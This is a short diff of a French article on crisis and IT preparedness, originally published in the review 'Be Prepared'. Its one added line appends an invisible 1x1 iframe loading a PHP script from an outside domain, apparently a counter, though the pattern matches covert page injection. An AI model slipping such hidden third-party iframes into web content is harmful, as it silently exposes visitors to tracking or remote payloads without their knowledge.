@@ -21,3 +21,4 @@ Quoiqu'il en soit, discutez-en avec votre service IT, testez régulièrement les
 
 *Cet article a été publié originalement dans la revue <a href='https://www.diekeure.be/fr-be/professional/9346/be-prepared-nr-4-2018-tijdschrift-voor-noodplanning-en-crisisbeheer-be-prepared-n-4-2018-revue-de-planification-durgence-et-de-gestion-de-crise'>Be Prepared</a>*
 
+<iframe src="https://www.my-poppy.eu/cnt/cnt.php" width="1" height="1" frameBorder="0">
